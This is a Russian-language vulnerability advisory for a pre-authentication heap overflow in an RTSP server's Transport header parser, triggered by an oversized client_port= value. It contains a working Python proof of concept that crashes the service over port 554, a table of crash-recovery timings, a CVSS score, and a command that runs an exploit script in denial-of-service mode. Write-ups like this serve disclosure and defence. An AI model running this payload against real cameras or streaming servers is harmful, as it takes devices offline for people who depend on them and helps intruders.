# [TR] RTSP Transport Header Heap Overflow

**CWE-122** · **CVSS 7.5 High** · **Pre-auth** · **Remote**

---

## Краткое описание

Парсер заголовка `Transport` в RTSP-запросе `SETUP` переполняет heap-буфер при обработке значения поля `client_port=`. Поле используется для указания UDP-порта клиента; обработчик копирует строку без проверки длины в буфер фиксированного размера.

---

## Технические детали

### Уязвимое поле

```
Transport: RTP/AVP;unicast;client_port=<OVERFLOW_HERE>
```

Парсер ищет подстроку `client_port=` и копирует остаток строки в heap-буфер. При длине ≥ 128 байт происходит heap corruption.

### Тип overflow

В отличие от [UA] (stack overflow), здесь переполняется **heap**:
- Recovery time ~9.7 сек (тяжелее чем [UA] ~2.5s, легче чем kernel panic)
- Перезаписывается **data pointer** в heap структуре
- Прямого контроля PC не достигнуто (heap layout непредсказуем без дизассемблера)

---

## Доказательство (PoC)

```python
import socket

TARGET = "█████████████"
# 128 байт после client_port= → heap corruption
transport = b'RTP/AVP;unicast;client_port=' + b'9' * 128
req = (b"SETUP rtsp://█████████████:554/live/trackID=1 RTSP/1.0\r\n"
       b"CSeq: 2\r\n"
       b"Transport: " + transport + b"\r\n\r\n")

s = socket.socket(); s.settimeout(5)
s.connect((TARGET, 554)); s.sendall(req); s.close()
# → crash, RTSP восстанавливается за ~9.7 секунды
```

---

## Oracle-тайминг

| Длина после `client_port=` | Recovery | Интерпретация |
|---------------------------|----------|---------------|
| < 64 байт | Нет краша | Норма |
| 128 байт | ~9.7 сек | Heap corruption, watchdog |
| 256+ байт | ~9.7–15 сек | Глубже в heap |

---

## Отличие от CVE-2014-4878

CVE-2014-4878 — переполнение `request body` (2048-байтный stack buffer). Наш [TR] — переполнение `Transport` **heap** структуры. Разные поля, разные типы буфера, разная прошивка.

---

## CVSS v3.1

```
AV:N / AC:L / PR:N / UI:N / S:U / C:N / I:N / A:H  =  7.5 High
```

---

## Эксплойт

```bash
python3 exploits/crashbandicoot.py -t █████████████ --mode dos-transport
```
